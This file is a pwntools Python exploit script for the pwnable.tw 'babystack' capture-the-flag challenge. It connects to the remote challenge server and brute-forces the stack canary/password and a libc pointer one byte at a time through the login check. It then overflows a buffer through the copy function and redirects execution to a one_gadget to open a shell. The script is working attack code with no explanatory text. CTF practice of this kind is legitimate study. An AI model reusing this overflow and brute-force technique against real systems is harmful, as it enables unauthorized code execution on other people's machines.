
#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("babystack_patched")
libc = ELF("./libc_64.so.6")
#ld = ELF("./ld-2.27.so")

local = False 
if local:
    p = process("./babystack_patched")
    #gdb.attach(p,'''c''')
else:
    p = remote('chall.pwnable.tw', 10205)

elf = context.binary = ELF('./babystack_patched', checksec=False)

def login(data):
    p.sendlineafter(b">>", b"1")
    p.sendlineafter(b"passowrd", data)

def copy(data):
    p.sendlineafter(b">>", b"3")
    p.sendlineafter(b"Copy :", data)

def bruteforce_byte(password):
    for i in range(0xff):
        login(password + (i + 1).to_bytes(1, 'little'))
        if b"Success" in p.recvuntil(b"!"):
            print((i + 1).to_bytes(1, 'little'))
            return (i + 1).to_bytes(1, 'little')
        
canary = b""
for f in range(16):
    canary += bruteforce_byte(canary)
    p.sendlineafter(b">>", b"1")

canary = int.from_bytes(canary, 'little')
print((hex(canary)))
canary_bytes = canary.to_bytes(16, 'big')

second_8_bytes = int.from_bytes(canary_bytes[:8], 'big')
first_8_bytes = int.from_bytes(canary_bytes[8:16], 'big')
print("First 8 bytes:", hex(first_8_bytes))
print("Second 8 bytes:", hex(second_8_bytes))

p.sendlineafter(b">>", b"1")
p.sendafter(b"passowrd", b"\x00" + b"a"*0x3f + p64(first_8_bytes) + p64(second_8_bytes) + b"a"*8)
copy(b"b"*0x3f)

p.sendlineafter(b">>", b"1")

passwrod = p64(first_8_bytes) + p64(second_8_bytes) + p64(0x6161616161610a31)
libc_leak = b""
for f in range(6):
    libc_leak += bruteforce_byte(passwrod + libc_leak)
    p.sendlineafter(b">>", b"1")

libc.address = int.from_bytes(libc_leak, 'little') - 458676
print("[+]Libc_base: ", (hex(libc.address)))

og1 = 0x45216 + libc.address
og2 = 0x4526a + libc.address
og3 = 0xef6c4 + libc.address
og4 = 0xf0567 + libc.address

p.sendlineafter(b">>", b"1")
p.sendafter(b"passowrd", b"\x00" + b"a"*0x3f + p64(first_8_bytes) + p64(second_8_bytes) + b"a"*0x18 + p64(og1))
copy(b"b"*0x3f)

p.sendlineafter(b">>", b"2")
p.interactive()
